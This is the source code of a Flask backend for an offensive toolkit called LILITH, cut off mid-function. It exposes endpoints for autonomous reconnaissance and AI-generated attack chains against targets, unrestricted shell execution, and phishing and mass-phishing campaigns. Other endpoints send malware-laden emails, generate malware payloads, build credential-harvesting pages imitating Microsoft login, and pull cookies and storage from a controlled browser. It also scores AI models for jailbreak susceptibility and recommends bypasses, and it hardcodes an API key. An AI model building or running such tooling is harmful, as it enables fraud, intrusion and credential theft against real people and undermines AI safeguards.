#!/usr/bin/env python3
# LILITH Backend - Complete Implementation

from flask import Flask, request, jsonify
import requests
import subprocess
import json
import threading
import time
import sqlite3
from datetime import datetime
import hashlib
import os
from pathlib import Path

# Sterilize utility (scan/quarantine/kill suspicious artifacts)
try:
    from sterilize import Sterilizer
    STERILIZER_AVAILABLE = True
except Exception:
    STERILIZER_AVAILABLE = False

app = Flask(__name__)

import configparser

config = configparser.ConfigParser()
config.read('config/lucifera.conf')

# Import the AI provider manager
try:
    from ai_providers import get_ai_manager, chat as ai_chat
    AI_PROVIDER_AVAILABLE = True
    print("[LILITH] AI Provider fallback system loaded")
except ImportError:
    AI_PROVIDER_AVAILABLE = False
    print("[LILITH] Warning: ai_providers.py not found, using legacy HF")

# OpenClaw integration
OPENCLAW_DIR = Path(__file__).resolve().parents[1] / 'openclaw'
OPENCLAW_AVAILABLE = (OPENCLAW_DIR / 'openclaw.mjs').exists()
if OPENCLAW_AVAILABLE:
    print(f"[LILITH] OpenClaw found at {OPENCLAW_DIR}")
else:
    print("[LILITH] Warning: OpenClaw not found")

HF_TOKEN = os.environ.get('HF_TOKEN') or config.get('lilith', 'hf_token', fallback=None)
MODEL_DEFAULT = config.get('lilith', 'model', fallback='llama3.2:3b')
CACHE_DIR = "/var/cache/lucifera"
PAYLOAD_DIR = "/var/lib/lucifera/payloads"
LOG_DIR = "/var/log/lucifera"

# Create directories
os.makedirs(CACHE_DIR, exist_ok=True)
os.makedirs(PAYLOAD_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

class LILITHAgent:
    def __init__(self):
        self.personality = "LILITH"
        self.threat_level = 0
        self.active_targets = {}
        self.payload_cache = {}
    
    def reason(self, query):
        '''LILITH reasoning engine - uses multi-provider fallback'''
        # Try the new AI provider system first
        if AI_PROVIDER_AVAILABLE:
            try:
                manager = get_ai_manager()
                result = manager.chat(query)
                if result['success']:
                    return result['response']
                else:
                    return f"AI Error: {result['response']}"
            except Exception as e:
                print(f"[LILITH] AI provider error: {e}")
        
        # Fallback to legacy HuggingFace (with new endpoint)
        try:
            model = MODEL_DEFAULT
            # Use NEW HuggingFace router endpoint
            url = f"https://router.huggingface.co/hf-inference/models/{model}"
            resp = requests.post(
                url,
                headers={"Authorization": f"Bearer {HF_TOKEN}"},
                json={"inputs": query, "parameters": {"max_length": 1024}},
                timeout=120
            )
            if resp.status_code == 200:
                j = resp.json()
                if isinstance(j, list) and 'generated_text' in j[0]:
                    return j[0]['generated_text']
                if isinstance(j, dict) and 'generated_text' in j:
                    return j['generated_text']
                return str(j)
            else:
                return f"HF error {resp.status_code}: {resp.text}"
        except Exception as e:
            return f"LILITH reasoning unavailable: {e}"
    
    def generate_attack_chain(self, target, objective):
        '''Generate complete attack chain'''
        prompt = f"""
        Target: {target}
        Objective: {objective}
        
        Generate a detailed attack chain including:
        1. Reconnaissance steps
        2. Entry points
        3. Privilege escalation path
        4. Persistence mechanism
        5. Data exfiltration method
        6. Defense evasion techniques
        """
        return self.reason(prompt)
    
    def analyze_model_behavior(self, model_output, jailbreak_attempt):
        '''KawaiiGPT-style behavior analysis'''
        prompt = f"""
        Analyze this model output for jailbreak susceptibility:
        Output: {model_output}
        Jailbreak Type: {jailbreak_attempt}
        
        Provide:
        - Risk score (0-100)
        - Guardrail bypass likelihood
        - Output volatility assessment
        - Recommended next jailbreak attempt
        """
        return self.reason(prompt)
    
    def generate_communication_template(self, style, target_org):
        '''Communication template generator (social engineering)'''
        prompt = f"""
        Generate a realistic {style} communication for {target_org}:
        - Email structure with urgency
        - Organizational tone mimicry
        - Phishing payload integration
        - Anti-detection techniques
        """
        return self.reason(prompt)
    
    def profile_target(self, target):
        '''Model behavior profiling'''
        profile = {
            'target': target,
            'risk_score': 0,
            'guardrail_bypass_likelihood': 0,
            'output_volatility': 0,
            'jailbreak_susceptibility': 0,
            'recommended_vectors': []
        }
        return profile

lilith = LILITHAgent()

# ===== ENDPOINTS =====

@app.route('/status', methods=['GET'])
def status():
    """Health check endpoint"""
    ai_status = None
    if AI_PROVIDER_AVAILABLE:
        try:
            manager = get_ai_manager()
            ai_status = manager.get_status()
        except:
            pass
    
    return jsonify({
        'status': 'online',
        'agent': 'LILITH',
        'model': MODEL_DEFAULT,
        'ai_providers': ai_status,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/ai/status', methods=['GET'])
def ai_provider_status():
    """Get AI provider status"""
    if not AI_PROVIDER_AVAILABLE:
        return jsonify({'error': 'AI provider system not available'}), 500
    
    manager = get_ai_manager()
    return jsonify(manager.get_status())

@app.route('/ai/reset', methods=['POST'])
def ai_provider_reset():
    """Reset AI provider(s)"""
    if not AI_PROVIDER_AVAILABLE:
        return jsonify({'error': 'AI provider system not available'}), 500
    
    manager = get_ai_manager()
    provider_name = request.json.get('provider') if request.json else None
    
    if provider_name:
        success = manager.reset_provider(provider_name)
        return jsonify({'success': success, 'reset': provider_name})
    else:
        manager.reset_all()
        return jsonify({'success': True, 'reset': 'all'})

@app.route('/learning/stats', methods=['GET'])
def get_learning_stats():
    """Get LILITH learning statistics"""
    try:
        from lilith_learning import get_learning_layer
        learning = get_learning_layer()
        stats = learning.get_learning_stats()
        return jsonify({'success': True, 'stats': stats})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/learning/insights', methods=['GET'])
def get_learning_insights():
    """Get recent learning insights"""
    try:
        from lilith_learning import get_learning_layer
        learning = get_learning_layer()
        
        # Get insights from database
        conn = sqlite3.connect(learning.db_path)
        c = conn.cursor()
        c.execute('''SELECT category, insight, confidence, created_at 
                     FROM learning_insights 
                     ORDER BY created_at DESC LIMIT 20''')
        insights = []
        for row in c.fetchall():
            insights.append({
                'category': row[0],
                'insight': row[1],
                'confidence': row[2],
                'created_at': row[3]
            })
        conn.close()
        
        return jsonify({'success': True, 'insights': insights})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/learning/best-techniques/<category>', methods=['GET'])
def get_best_techniques(category):
    """Get best techniques for a category"""
    try:
        from lilith_learning import get_learning_layer, LearningCategory
        learning = get_learning_layer()
        
        try:
            cat_enum = LearningCategory(category)
        except ValueError:
            return jsonify({'success': False, 'error': f'Invalid category: {category}'})
        
        techniques = learning.get_best_techniques(cat_enum, 10)
        result = []
        for tech in techniques:
            result.append({
                'pattern_id': tech.pattern_id,
                'description': tech.description,
                'success_rate': tech.success_rate,
                'avg_execution_time': tech.avg_execution_time,
                'token_efficiency': tech.token_efficiency,
                'times_used': tech.times_used
            })
        
        return jsonify({'success': True, 'techniques': result})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
def coding_agent_status():
    """Return availability of coding-agent (pi/npx/npm) and Groq key status"""
    env = os.environ.copy()
    def _check(cmd, timeout=5):
        try:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, env=env)
            return r.returncode == 0, (r.stdout + r.stderr).strip()
        except Exception as e:
            return False, str(e)
    pi_ok, pi_out = _check('pi --version')
    npx_ok, npx_out = _check('npx --version')
    npm_ok, npm_out = _check('npm --version')
    groq_key = env.get('GROQ_API_KEY') or None
    return jsonify({
        'pi_installed': pi_ok,
        'pi_output': pi_out,
        'npx_available': npx_ok,
        'npx_output': npx_out,
        'npm_available': npm_ok,
        'npm_output': npm_out,
        'groq_key_present': bool(groq_key),
        'note': 'If pi is not installed, you can run: npm install -g @mariozechner/pi-coding-agent or use npx as a fallback.'
    })


@app.route('/skill/run', methods=['POST'])
def skill_run():
    """Run a skill (for testing) - JSON: {skill: 'coding-agent', task: '...'}"""
    payload = request.json or {}
    skill = payload.get('skill')
    task = payload.get('task', '')
    timeout = int(payload.get('timeout', 120))
    if not skill or not task:
        return jsonify({'success': False, 'error': 'Provide skill and task in JSON body (skill, task)'}), 400
    result = run_openclaw_skill(skill, task, timeout=timeout)
    return jsonify(result)

@app.route('/chat', methods=['POST'])
def chat():
    msg = request.json.get('message', '')
    
    # Use new AI provider system if available
    if AI_PROVIDER_AVAILABLE:
        manager = get_ai_manager()
        result = manager.chat(msg)
        return jsonify({
            'response': result['response'],
            'provider': result.get('provider'),
            'model': result.get('model'),
            'success': result['success'],
            'timestamp': datetime.now().isoformat()
        })
    else:
        response = lilith.reason(msg)
        return jsonify({'response': response, 'timestamp': datetime.now().isoformat()})

@app.route('/attack_chain', methods=['POST'])
def attack_chain():
    target = request.json.get('target')
    objective = request.json.get('objective', 'Full compromise')
    chain = lilith.generate_attack_chain(target, objective)
    return jsonify({'attack_chain': chain})

@app.route('/auto_attack', methods=['POST'])
def auto_attack():
    """Autonomous attack - recon, analyze, attack chain, execute"""
    target = request.json.get('target', '')
    attack_type = request.json.get('type', 'full')  # full, recon_only, phishing, exploit
    
    if not target:
        return jsonify({'success': False, 'error': 'No target specified'})
    
    results = {
        'target': target,
        'phases': [],
        'commands_executed': [],
        'findings': [],
        'attack_chain': [],
        'success': True
    }
    
    # Extract domain
    domain = target.replace('https://', '').replace('http://', '').split('/')[0]
    
    # Phase 1: Reconnaissance
    results['phases'].append({'phase': 'RECON', 'status': 'running'})
    recon_data = {}
    
    try:
        # DNS Enumeration
        dns_result = subprocess.run(['nslookup', domain], capture_output=True, text=True, timeout=10)
        recon_data['dns'] = dns_result.stdout
        results['commands_executed'].append(f'nslookup {domain}')
        
        # HTTP Headers
        headers_result = subprocess.run(['curl.exe', '-s', '-I', f'https://{domain}'], capture_output=True, text=True, timeout=15)
        recon_data['headers'] = headers_result.stdout
        results['commands_executed'].append(f'curl.exe -I https://{domain}')
        
        # Technology detection via Python toolkit
        import sys
        sys.path.insert(0, os.path.dirname(__file__))
        try:
            from recon_toolkit import detect_technologies, port_scan
            tech_result = detect_technologies(f'https://{domain}')
            recon_data['technologies'] = tech_result
            
            # Quick port scan
            ports_result = port_scan(domain, [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 5432, 8080, 8443])
            recon_data['open_ports'] = ports_result.get('open_ports', [])
        except ImportError:
            recon_data['technologies'] = {'error': 'recon_toolkit not available'}
            recon_data['open_ports'] = []
        
        results['phases'][-1]['status'] = 'complete'
        results['phases'][-1]['data'] = recon_data
        
    except Exception as e:
        results['phases'][-1]['status'] = 'error'
        results['phases'][-1]['error'] = str(e)
    
    if attack_type == 'recon_only':
        return jsonify(results)
    
    # Phase 2: LILITH Analysis
    results['phases'].append({'phase': 'ANALYSIS', 'status': 'running'})
    
    try:
        analysis_prompt = f"""Analyze this reconnaissance data for {target} and identify vulnerabilities:

DNS Info: {recon_data.get('dns', 'N/A')[:500]}
HTTP Headers: {recon_data.get('headers', 'N/A')[:500]}
Technologies: {recon_data.get('technologies', {})}
Open Ports: {recon_data.get('open_ports', [])}

Provide:
1. Security weaknesses found
2. Missing security headers
3. Vulnerable technologies/versions
4. Attack vectors to exploit
5. Risk rating (Critical/High/Medium/Low)

Be specific and actionable."""

        if AI_PROVIDER_AVAILABLE:
            manager = get_ai_manager()
            analysis_result = manager.chat(analysis_prompt)
            analysis = analysis_result.get('response', '')
        else:
            analysis = lilith.reason(analysis_prompt)
        
        results['findings'].append(analysis)
        results['phases'][-1]['status'] = 'complete'
        results['phases'][-1]['analysis'] = analysis[:2000]
        
    except Exception as e:
        results['phases'][-1]['status'] = 'error'
        results['phases'][-1]['error'] = str(e)
    
    # Phase 3: Generate Attack Chain
    results['phases'].append({'phase': 'ATTACK_CHAIN', 'status': 'running'})
    
    try:
        chain_prompt = f"""Based on this analysis of {target}, generate an attack chain.

Findings: {analysis[:1000] if 'analysis' in dir() else 'No analysis available'}
Open Ports: {recon_data.get('open_ports', [])}
Technologies: {recon_data.get('technologies', {})}

Generate a step-by-step attack chain with:
1. Initial access method
2. Exploitation technique
3. Privilege escalation path
4. Persistence mechanism
5. Data exfiltration method

For each step, provide the exact Windows-compatible command to execute.
Format: [EXECUTE: command]"""

        if AI_PROVIDER_AVAILABLE:
            manager = get_ai_manager()
            chain_result = manager.chat(chain_prompt)
            attack_chain = chain_result.get('response', '')
        else:
            attack_chain = lilith.generate_attack_chain(target, 'Full compromise')
        
        results['attack_chain'] = attack_chain
        results['phases'][-1]['status'] = 'complete'
        results['phases'][-1]['chain'] = attack_chain[:2000]
        
    except Exception as e:
        results['phases'][-1]['status'] = 'error'
        results['phases'][-1]['error'] = str(e)
    
    # Phase 4: Execute (if enabled)
    if attack_type == 'full':
        results['phases'].append({'phase': 'EXECUTION', 'status': 'ready'})
        results['phases'][-1]['note'] = 'Attack chain generated. Manual execution recommended for safety.'
    
    return jsonify(results)

@app.route('/analyze_jailbreak', methods=['POST'])
def analyze_jailbreak():
    output = request.json.get('output')
    jailbreak = request.json.get('jailbreak_type')
    analysis = lilith.analyze_model_behavior(output, jailbreak)
    return jsonify({'analysis': analysis})

@app.route('/generate_template', methods=['POST'])
def generate_template():
    style = request.json.get('style', 'email')
    org = request.json.get('organization', 'Generic Corp')
    template = lilith.generate_communication_template(style, org)
    return jsonify({'template': template})

@app.route('/profile', methods=['POST'])
def profile():
    target = request.json.get('target')
    profile = lilith.profile_target(target)
    return jsonify(profile)

@app.route('/execute', methods=['POST'])
def execute():
    cmd = request.json.get('command', '')
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return jsonify({
            'stdout': result.stdout[:2000],
            'stderr': result.stderr[:2000],
            'returncode': result.returncode
        })
    except Exception as e:
        return jsonify({'error': str(e)})

@app.route('/garak_scan', methods=['POST'])
def garak_scan():
    '''Integrate Garak vulnerability scanner'''
    model = request.json.get('model', MODEL_DEFAULT)
    probes = request.json.get('probes', ['dan', 'injection'])
    
    cmd = f"garak --probes {','.join(probes)} --target_type ollama --target_name {model}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
    
    return jsonify({
        'scan_results': result.stdout,
        'vulnerabilities': len(result.stdout.split('\n'))
    })

@app.route('/kawaiigpt_analyze', methods=['POST'])
def kawaiigpt_analyze():
    '''KawaiiGPT jailbreak analysis integration'''
    target_model = request.json.get('model')
    analysis_type = request.json.get('analysis_type', 'full')
    
    analysis = lilith.analyze_model_behavior(target_model, analysis_type)
    
    return jsonify({
        'analysis': analysis,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/sandbox_execute', methods=['POST'])
def sandbox_execute():
    '''Execute code in isolated sandbox'''
    code = request.json.get('code')
    language = request.json.get('language', 'python3')
    
    # Write to temp file
    temp_file = f"/tmp/sandbox_{hashlib.md5(code.encode()).hexdigest()}.{language}"
    with open(temp_file, 'w') as f:
        f.write(code)
    
    # Execute in timeout
    try:
        result = subprocess.run(
            [language, temp_file],
            capture_output=True,
            text=True,
            timeout=10
        )
        return jsonify({
            'output': result.stdout,
            'errors': result.stderr,
            'hallucinations': [] # Detect model hallucinations
        })
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Execution timeout - possible infinite loop'})

# ==================== EMAIL AUTOMATION ENDPOINTS ====================

@app.route('/email/disposable', methods=['GET', 'POST'])
def get_disposable_email():
    """Get a disposable email address"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        result = ea.get_disposable_email()
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/email/phish', methods=['POST'])
def send_phishing_email():
    """Send a phishing email"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        
        data = request.json
        to = data.get('to')
        template = data.get('template', 'password_reset')
        attack_url = data.get('attack_url', 'http://localhost/')
        
        if not to:
            return jsonify({'success': False, 'error': 'Missing "to" field'})
        
        result = ea.send_phishing_email(to, template, attack_url)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/email/malware', methods=['POST'])
def send_malware_email():
    """Send email with malware attachment"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        
        data = request.json
        to = data.get('to')
        malware_type = data.get('malware_type', 'macro_doc')
        payload_url = data.get('payload_url')
        template = data.get('template', 'invoice')
        
        if not to:
            return jsonify({'success': False, 'error': 'Missing "to" field'})
        
        result = ea.send_malware_email(to, malware_type, payload_url, template)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/email/mass_phish', methods=['POST'])
def mass_phishing():
    """Send mass phishing campaign to multiple targets"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        import time
        import random
        
        data = request.json
        targets = data.get('targets', [])
        template = data.get('template', 'password_reset')
        attack_url = data.get('attack_url', 'http://localhost/')
        payload_type = data.get('payload_type', 'tracking_pixel')
        delay_range = data.get('delay', [30, 120])  # seconds between emails
        
        if not targets:
            return jsonify({'success': False, 'error': 'No targets provided'})
        
        sent = []
        failed = []
        
        for i, target in enumerate(targets):
            try:
                # Send phishing email
                result = ea.send_phishing_email(target, template, attack_url)
                if result.get('success'):
                    sent.append(target)
                else:
                    failed.append({'target': target, 'error': result.get('error')})
            except Exception as e:
                failed.append({'target': target, 'error': str(e)})
            
            # Delay between emails (except last one)
            if i < len(targets) - 1 and delay_range:
                delay = random.randint(delay_range[0], delay_range[1])
                time.sleep(delay)
        
        return jsonify({
            'success': True,
            'sent': sent,
            'failed': failed,
            'total_sent': len(sent),
            'total_failed': len(failed)
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/email/templates', methods=['GET'])
def get_email_templates():
    """Get available phishing templates"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        templates = ea.get_available_templates()
        return jsonify({'success': True, 'templates': templates})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/malware/types', methods=['GET'])
def get_malware_types():
    """Get available malware types"""
    try:
        from malware_factory import get_malware_factory
        factory = get_malware_factory()
        types = list(factory.PAYLOAD_TEMPLATES.keys())
        return jsonify({'success': True, 'types': types})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/malware/generate', methods=['POST'])
def generate_malware():
    """Generate a malware payload"""
    try:
        from malware_factory import get_malware_factory
        factory = get_malware_factory()
        
        data = request.json
        attack_type = data.get('attack_type', 'macro_doc')
        payload_url = data.get('payload_url')
        
        result = factory.create_email_attachment(attack_type, payload_url)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/harvester/create', methods=['POST'])
def create_harvester():
    """Create a credential harvester page"""
    try:
        from email_automation import get_email_automation
        ea = get_email_automation()
        
        data = request.json
        target_url = data.get('target_url', 'https://login.microsoft.com')
        callback_url = data.get('callback_url')
        
        result = ea.create_credential_harvester(target_url, callback_url)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== BROWSER CONTROL ENDPOINTS ====================

@app.route('/browser/start', methods=['POST'])
def browser_start():
    """Start the browser"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        result = browser.start()
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/browser/navigate', methods=['POST'])
def browser_navigate():
    """Navigate to a URL"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        
        data = request.json or {}
        url = data.get('url', 'about:blank')
        
        result = browser.navigate(url)
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/browser/screenshot', methods=['POST'])
def browser_screenshot():
    """Take a screenshot"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        result = browser.screenshot()
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/browser/execute_js', methods=['POST'])
def browser_execute_js():
    """Execute JavaScript"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        
        data = request.json or {}
        script = data.get('script', '')
        
        result = browser.execute_js(script)
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/browser/stop', methods=['POST'])
def browser_stop():
    """Stop the browser"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        result = browser.stop()
        return jsonify(result)
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

@app.route('/browser/cookies', methods=['GET'])
def browser_cookies():
    """Get browser cookies - thread-safe"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        
        if not browser._running:
            return jsonify({'success': False, 'error': 'Browser not running'})
        
        # Use thread-safe method
        result = browser.get_cookies()
        if result.get('status') == 'success':
            return jsonify({'success': True, 'cookies': result.get('cookies', [])})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/browser/storage', methods=['GET'])
def browser_storage():
    """Get browser localStorage and sessionStorage - thread-safe"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        
        if not browser._running:
            return jsonify({'success': False, 'error': 'Browser not running'})
        
        # Use thread-safe method
        result = browser.get_storage()
        if result.get('status') == 'success':
            return jsonify({
                'success': True,
                'localStorage': result.get('localStorage', {}),
                'sessionStorage': result.get('sessionStorage', {})
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/browser/content', methods=['GET'])
def browser_content():
    """Get page HTML content - thread-safe"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        
        if not browser._running:
            return jsonify({'success': False, 'error': 'Browser not running'})
        
        # Use thread-safe method
        result = browser.get_page_content()
        if result.get('status') == 'success':
            return jsonify({
                'success': True, 
                'content': result.get('content', ''),
                'url': result.get('url'),
                'title': result.get('title')
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Unknown error')})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/browser/status', methods=['GET'])
def browser_status():
    """Get browser status"""
    try:
        from browser_controller_thread import get_browser
        browser = get_browser()
        return jsonify({
            'status': 'running' if browser._running else 'stopped',
            'current_url': getattr(browser, '_current_url', None)
        })
    except Exception as e:
        return jsonify({'status': 'error', 'error': str(e)})

# ==================== OPENCLAW INTEGRATION ====================

def run_openclaw_command(cmd_args, timeout=60):
    """Run an OpenClaw command and return result"""
    if not OPENCLAW_AVAILABLE:
        return {'success': False, 'error': 'OpenClaw not available'}
    
    try:
        # Set Groq API key for OpenClaw
        env = os.environ.copy()
        env['GROQ_API_KEY'] = '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'
        
        full_cmd = f'node openclaw.mjs {cmd_args}'
        result = subprocess.run(
            full_cmd,
            shell=True,
            cwd=str(OPENCLAW_DIR),
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env
        )
        return {
            'success': result.returncode == 0,
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': f'Command timed out ({timeout}s)'}
    except Exception as e:
        return {'success': False, 'error': str(e)}


def run_openclaw_skill(skill_name, task, timeout=120):
    """
    Run an OpenClaw skill using the appropriate method.
    - coding-agent: Uses Pi with Groq directly (most reliable)
    - Other skills: Uses OpenClaw bash or direct command
    """
    if not OPENCLAW_AVAILABLE:
        return {'success': False, 'error': 'OpenClaw not available'}
    
    try:
        env = os.environ.copy()
        env['GROQ_API_KEY'] = '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'
        
        # Handle coding-agent specially - use Pi directly with Groq (with robust fallbacks)
        if skill_name == 'coding-agent':
            import tempfile
            workdir = tempfile.mkdtemp(prefix='lilith_code_')
            model = 'llama-3.3-70b-versatile'

            from types import SimpleNamespace
            def _run_cmd(cmd, cwd=workdir, cmd_timeout=None):
                tt = cmd_timeout or timeout
                try:
                    res = subprocess.run(
                        cmd,
                        shell=True,
                        cwd=cwd,
                        capture_output=True,
                        text=True,
                        timeout=tt,
                        env=env
                    )
                    return res
                except subprocess.TimeoutExpired:
                    # Return a lightweight object indicating timeout
                    return SimpleNamespace(returncode=-1, stdout='', stderr=f'Timed out after {tt}s')
                except Exception as e:
                    return SimpleNamespace(returncode=-1, stdout='', stderr=str(e))

            # First try native 'pi' if available
            pi_check = _run_cmd('pi --version')
            if pi_check and pi_check.returncode == 0:
                cmd = f'pi --provider groq --model {model} -p "{task}"'
                result = _run_cmd(cmd)
                if result is None:
                    return {'success': False, 'error': 'pi execution timed out or failed to start', 'output': '' , 'skill': skill_name, 'task': task, 'workdir': workdir}
                return {'success': result.returncode == 0, 'output': result.stdout + result.stderr, 'skill': skill_name, 'task': task, 'workdir': workdir}

            # Try npx fallback (no global install required)
            npx_cmd = f'npx --yes @mariozechner/pi-coding-agent --provider groq --model {model} -p "{task}"'
            # npx may need to download packages; allow a longer timeout
            npx_res = _run_cmd(npx_cmd, cmd_timeout=120)
            if npx_res and npx_res.returncode == 0:
                return {'success': True, 'output': npx_res.stdout + npx_res.stderr, 'skill': skill_name, 'task': task, 'workdir': workdir, 'note': 'ran via npx'}
            if npx_res and npx_res.returncode == -1:
                # timed out or failed - include details and fall through to npm install attempt
                npx_err = npx_res.stderr or 'npx timed out or failed'
            else:
                npx_err = None

            # Attempt to install globally via npm if npx failed
            npm_check = _run_cmd('npm --version')
            if npm_check and npm_check.returncode == 0:
                install_cmd = 'npm install -g @mariozechner/pi-coding-agent'
                install_res = _run_cmd(install_cmd)
                if install_res and install_res.returncode == 0:
                    # Retry native pi after install
                    cmd = f'pi --provider groq --model {model} -p "{task}"'
                    result = _run_cmd(cmd)
                    if result:
                        return {'success': result.returncode == 0, 'output': result.stdout + result.stderr, 'skill': skill_name, 'task': task, 'workdir': workdir, 'note': 'installed via npm'}
                    else:
                        return {'success': False, 'error': 'pi installed but failed to run', 'output': (install_res.stdout or '') + (install_res.stderr or ''), 'skill': skill_name, 'task': task, 'workdir': workdir}
                else:
                    return {'success': False, 'error': 'npm install failed; please install @mariozechner/pi-coding-agent manually', 'output': (install_res.stdout if install_res else '') + (install_res.stderr if install_res else ''), 'skill': skill_name, 'task': task, 'workdir': workdir}

            # No npx/npm available - give actionable error
            return {'success': False, 'error': 'pi not found and npx/npm not available. Install Node.js and run npm install -g @mariozechner/pi-coding-agent or ensure pi is in PATH', 'skill': skill_name, 'task': task, 'workdir': workdir}
        
        # Handle github skill
        elif skill_name == 'github':
            cmd = f'gh {task}'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                env=env
            )
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'skill': skill_name,
                'task': task
            }
        
        # Handle discord notification
        elif skill_name == 'discord':
            # Discord webhook or notification
            return {
                'success': True,
                'output': f'Discord notification queued: {task}',
                'skill': skill_name,
                'task': task
            }
        
        # Handle oracle (AI reasoning)
        elif skill_name == 'oracle':
            # Use Groq for AI reasoning
            from groq import Groq
            client = Groq(api_key=env['GROQ_API_KEY'])
            chat_completion = client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "You are an AI oracle for red team operations. Analyze and provide insights."},
                    {"role": "user", "content": task}
                ],
                model="llama-3.3-70b-versatile",
                max_tokens=2000
            )
            return {
                'success': True,
                'output': chat_completion.choices[0].message.content,
                'skill': skill_name,
                'task': task
            }
        
        # Default: try to run as bash command through OpenClaw
        else:
            # Use OpenClaw bash for other skills
            escaped_task = task.replace('"', '\\"')
            cmd = f'node openclaw.mjs bash command:"{escaped_task}" timeout:{timeout}'
            
            result = subprocess.run(
                cmd,
                shell=True,
                cwd=str(OPENCLAW_DIR),
                capture_output=True,
                text=True,
                timeout=timeout + 30,
                env=env
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout + result.stderr,
                'skill': skill_name,
                'task': task
            }
            
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': f'Skill execution timed out ({timeout}s)'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

@app.route('/openclaw/status', methods=['GET'])
def openclaw_status():
    """Check OpenClaw status"""
    if not OPENCLAW_AVAILABLE:
        return jsonify({'available': False, 'error': 'OpenClaw not installed'})
    
    result = run_openclaw_command('--version', timeout=10)
    return jsonify({
        'available': True,
        'version': result.get('stdout', '').strip() if result['success'] else 'unknown',
        'path': str(OPENCLAW_DIR)
    })

@app.route('/openclaw/skills', methods=['GET'])
def openclaw_skills():
    """List available OpenClaw skills"""
    if not OPENCLAW_AVAILABLE:
        return jsonify({'success': False, 'error': 'OpenClaw not available'})
    
    skills_dir = OPENCLAW_DIR / 'skills'
    if skills_dir.exists():
        skills = [d.name for d in skills_dir.iterdir() if d.is_dir() and not d.name.startswith('.')]
        return jsonify({
            'success': True,
            'skills': sorted(skills),
            'count': len(skills)
        })
    return jsonify({'success': False, 'error': 'Skills directory not found'})

@app.route('/openclaw/run', methods=['POST'])
def openclaw_run():
    """Run an OpenClaw command"""
    if not OPENCLAW_AVAILABLE:
        return jsonify({'success': False, 'error': 'OpenClaw not available'})
    
    data = request.json or {}
    command = data.get('command', '')
    timeout = data.get('timeout', 60)
    
    if not command:
        return jsonify({'success': False, 'error': 'No command specified'})
    
    # Security: basic command sanitization
    if any(c in command for c in [';', '&&', '||', '`', '$(']):
        return jsonify({'success': False, 'error': 'Invalid characters in command'})
    
    result = run_openclaw_command(command, timeout=timeout)
    return jsonify(result)

@app.route('/openclaw/skill/<skill_name>', methods=['POST'])
def openclaw_skill(skill_name):
    """Run a specific OpenClaw skill"""
    if not OPENCLAW_AVAILABLE:
        return jsonify({'success': False, 'error': 'OpenClaw not available'})
    
    data = request.json or {}
    args = data.get('args', '')
    timeout = data.get('timeout', 120)
    
    # Check if this is an internal LUCIFER-OS skill
    internal_skills = {
        'lilith': handle_lilith_skill,
        'healthcheck': handle_healthcheck_skill,
        'model-usage': handle_model_usage_skill,
        'session-logs': handle_session_logs_skill,
        'voice-call': handle_voice_call_skill,
        'coding-agent': handle_coding_agent_skill
    }
    
    if skill_name in internal_skills:
        try:
            result = internal_skills[skill_name](args, timeout)
            return jsonify(result)
        except Exception as e:
